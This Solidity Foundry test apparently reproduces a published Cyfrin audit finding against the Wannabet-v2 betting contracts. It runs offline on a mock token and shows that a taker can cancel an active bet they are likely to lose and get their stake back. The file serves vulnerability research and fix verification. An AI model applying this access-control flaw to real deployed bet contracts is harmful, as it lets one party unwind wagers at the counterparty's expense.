// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

// Proof of Vulnerability for finding 64637 (Cyfrin, Wannabet-v2):
// "Active and pending bets can be cancelled by anyone".
//
// Bet.cancel only blocks the maker from cancelling an active bet. Anyone else,
// including the taker, can cancel a non-expired ACTIVE bet and unwind it. The
// taker uses this to back out after seeing their side is likely to lose.
//
// Source: data_collection/tier1_after_2025-08-31/64637.md (published Cyfrin PoC).
// The published PoC runs on a live fork of Base; this version runs fully OFFLINE
// against a local mock ERC20 and the local Bet/BetFactory (no fork, no live
// addresses). The exploited bet has no Aave pool configured, so the Aave code
// path in Bet is never executed.
//
// Written to compile on both the vulnerable commit and the fix: it never reads
// the renamed Bet struct field (resolveBy -> endsBy) and never names the
// Status.JUDGING enum member that the fix adds.

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {Bet} from "../src/Bet.sol";
import {BetFactory} from "../src/BetFactory.sol";
import {IBet} from "../src/interfaces/IBet.sol";

contract MockUSDC is ERC20 {
    constructor() ERC20("Mock USD Coin", "USDC") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract PoV64637_Wannabet is Test {
    BetFactory betFactory;
    address maker = makeAddr("maker");
    address taker = makeAddr("taker");
    address judge = makeAddr("judge");
    address owner = makeAddr("owner");
    MockUSDC usdc;
    IBet betNoPool;

    // The resolveBy / endsBy timestamp passed at bet creation, kept here so the
    // test can warp without reading the (renamed) struct field.
    uint40 resolveByTs;

    function setUp() public {
        usdc = new MockUSDC();

        // Fund maker and taker. Offline mock instead of forking Base for USDC.
        usdc.mint(maker, 1000 * 1e6);
        usdc.mint(taker, 1000 * 1e6);

        Bet betImplementation = new Bet();
        betFactory = new BetFactory(owner, address(betImplementation));

        uint40 acceptBy = uint40(block.timestamp + 1000);
        resolveByTs = uint40(block.timestamp + 2000);

        // Predict the bet address, approve it, then create the bet.
        // No Aave pool is configured for this token, so betNoPool has no pool.
        address betNoPoolAddress = betFactory.predictBetAddress(maker, taker, acceptBy, resolveByTs);

        vm.startPrank(maker);
        usdc.approve(betNoPoolAddress, 1000);
        betNoPool = IBet(
            betFactory.createBet(taker, judge, address(usdc), 1000, 1000, acceptBy, resolveByTs, "Test bet")
        );
        vm.stopPrank();
    }

    // Anyone can cancel a non-expired ACTIVE bet.
    function test_ActiveBetCanBeCancelledByAnyone() public {
        // 1. Have the taker accept the bet so it becomes ACTIVE
        vm.startPrank(taker);
        usdc.approve(address(betNoPool), 1000);
        betNoPool.accept();
        vm.stopPrank();

        // Sanity check: bet is ACTIVE
        assertEq(uint(betNoPool.bet().status), uint(IBet.Status.ACTIVE));

        // 2. Warp to a time before resolveBy so the bet is still non-expired
        vm.warp(uint256(resolveByTs) - 1);
        assertEq(uint(betNoPool.bet().status), uint(IBet.Status.ACTIVE));

        uint256 makerBalanceBefore = usdc.balanceOf(maker);
        uint256 takerBalanceBefore = usdc.balanceOf(taker);

        // 3. taker cancels the bet
        vm.prank(taker);
        betNoPool.cancel();

        // 4. After cancellation, the bet is marked CANCELLED and funds are refunded
        assertEq(uint(betNoPool.bet().status), uint(IBet.Status.CANCELLED));
        assertEq(usdc.balanceOf(maker) - makerBalanceBefore, 1000);
        assertEq(usdc.balanceOf(taker) - takerBalanceBefore, 1000);
    }
}
